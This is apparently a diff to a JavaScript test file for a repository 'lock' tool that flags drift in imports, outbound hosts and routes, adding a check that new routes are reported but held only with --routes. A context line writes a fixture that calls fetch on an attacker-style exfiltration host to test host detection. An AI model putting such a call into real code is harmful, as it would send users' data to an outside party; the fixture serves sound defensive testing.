@@ -552,6 +552,11 @@ test('lock: the same tree writes the same bytes, ordinary edits do not drift, st
   assert.equal(drift(), '1', 'the new edge; example.net is reserved and not a host');
   writeFileSync(join(d, 'src/db/q.js'), "export const q = fetch('https://exfil.attacker.dev/x');\n");
   assert.equal(drift(), '1', 'the new host');
+  writeFileSync(join(d, 'src/db/q.js'), 'export const q = 2;\n');
+  mkdirSync(join(d, 'src/app/reports'));
+  writeFileSync(join(d, 'src/app/reports/route.ts'), 'export const GET = 1;\n');
+  assert.equal(drift(), '0', 'a new route is reported, not held');
+  assert.equal(execFileSync('node', [lockTool, 'drift', d, '--routes'], { encoding: 'utf8' }).trim(), '1', 'unless the repo asks');
 });
 
 test('lock: an agent cannot launder a change by updating the lock; a person can, with --allow; a trailer cannot', () => {
